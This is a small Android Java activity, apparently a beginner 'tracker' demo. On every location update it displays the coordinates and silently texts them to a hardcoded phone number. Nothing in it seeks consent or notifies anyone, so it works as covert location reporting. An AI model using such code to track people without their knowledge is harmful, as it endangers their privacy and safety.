package com.example.tracker;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.telephony.SmsManager;
import android.view.Menu;
import android.widget.EditText;

public class MainActivity extends Activity {
	EditText loc;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        loc=(EditText) findViewById(R.id.editText1 );
        
        
        LocationManager gps=(LocationManager) getSystemService(Context.LOCATION_SERVICE );
        
        
         gps.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 10, new LocationListener() {
			
			public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
				// TODO Auto-generated method stub
				
			}
			
			public void onProviderEnabled(String arg0) {
				// TODO Auto-generated method stub
				
			}
			
			public void onProviderDisabled(String arg0) {
				// TODO Auto-generated method stub
				
			}
			
			public void onLocationChanged(Location arg0) {
				// TODO Auto-generated method stub
				loc.setText(arg0.getLatitude()+","+arg0.getLongitude());
				SmsManager.getDefault().sendTextMessage("8286651449"
						, null, loc.getText().toString(), null, null);
				
			}
		});
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
}
